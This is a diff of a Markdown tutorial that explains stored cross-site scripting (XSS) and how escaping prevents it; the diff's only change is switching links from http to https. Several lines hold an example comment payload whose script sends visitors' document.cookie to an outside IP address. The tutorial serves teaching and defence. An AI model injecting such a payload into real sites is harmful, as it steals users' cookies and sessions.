@@ -65,7 +65,7 @@ HTML also supports <tooltip content="In HTML, anything between the opening and c
 What happens when a malicious user submits the following as a comment?
 
 ```html
-This is an innocent looking comment. <script>sendToServer("http://139.241.0.3/", document.cookie)</script>
+This is an innocent looking comment. <script>sendToServer("https://139.241.0.3/", document.cookie)</script>
 ```
 
 It becomes: 
@@ -77,7 +77,7 @@ This is an innocent looking comment.
 
 Visitors of the blog will only see the non-script portion of the comment. The script portion is rendered as `Javascript` just like how the `<b>` and `<i>` tags causes text to be **bolded** and *italicised* but the tags themselves are not shown. 
 
-The script `<script>sendToServer("http://139.241.0.3/", document.cookie)</script>` will be run immediately when the visitors load the website. Here, the visitor will be unaware that his <tooltip content="A cookie is a piece of data sent from the server and stored on the client's computer. It can contain sensitive information such as login data.">cookie</tooltip> is stolen. 
+The script `<script>sendToServer("https://139.241.0.3/", document.cookie)</script>` will be run immediately when the visitors load the website. Here, the visitor will be unaware that his <tooltip content="A cookie is a piece of data sent from the server and stored on the client's computer. It can contain sensitive information such as login data.">cookie</tooltip> is stolen. 
 
 
 Therefore, the malicious user has managed to add additional "functionalities" to the website that is not intended by the original website developer.
@@ -149,7 +149,7 @@ In the above example, the comment section will become like this:
     That's a very nice picture! <br>
     Good photograph! <br>
     I **like** your photograph! <br>
-    This is an innocent looking comment. `<script>sendToServer("http://139.241.0.3/", document.cookie)</script>`
+    This is an innocent looking comment. `<script>sendToServer("https://139.241.0.3/", document.cookie)</script>`
 
     The `<script>` and `</script>` will be displayed as text rather than being run as `JavaScript` by the browser.
 
@@ -173,7 +173,7 @@ It will result in the button running the javascript code when pressed → <a hre
 You can also consider using XSS scanning tools to check whether your web application is vulnerable. Below are links of some open-source XSS scanning tools: 
 
 1. http://wapiti.sourceforge.net/ (Web Application Vulnerability Scanner)
-1. http://w3af.org/ (Web Application Attack and Audit Framework)
+1. https://w3af.org/ (Web Application Attack and Audit Framework)
 1. https://www.arachni-scanner.com/ (Web Application Security Scanner Framework)
 
 ## Where to Go From Here?
@@ -191,7 +191,7 @@ References:
 (Basic description of the XSS attack taken from here)
 1. https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Stored_and_Reflected_XSS_Attacks
 (Description of the two types of XSS attack taken from here)
-1. http://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html
+1. https://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html
 (Origin of the name "Cross Site Scripting")
 1. https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf (Statistical Summary taken from here)
 
@@ -201,7 +201,7 @@ Additional Reading Resources:
 (How to manually test your own website for XSS attacks?)
 1. https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet
 (A list of possible preventions, which contains even more ways to protect your site from XSS attacks).
-1. http://guides.rubyonrails.org/security.html#cross-site-scripting-xss
+1. https://guides.rubyonrails.org/security.html#cross-site-scripting-xss
 (In-depth discussion of how XSS attacks work, the different possible scenarios of such attacks, and possible preventive measures)
 1. https://www.owasp.org/index.php/DOM_Based_XSS
 (Discussion about DOM-based XSS attacks, a third possible type of XSS attacks)
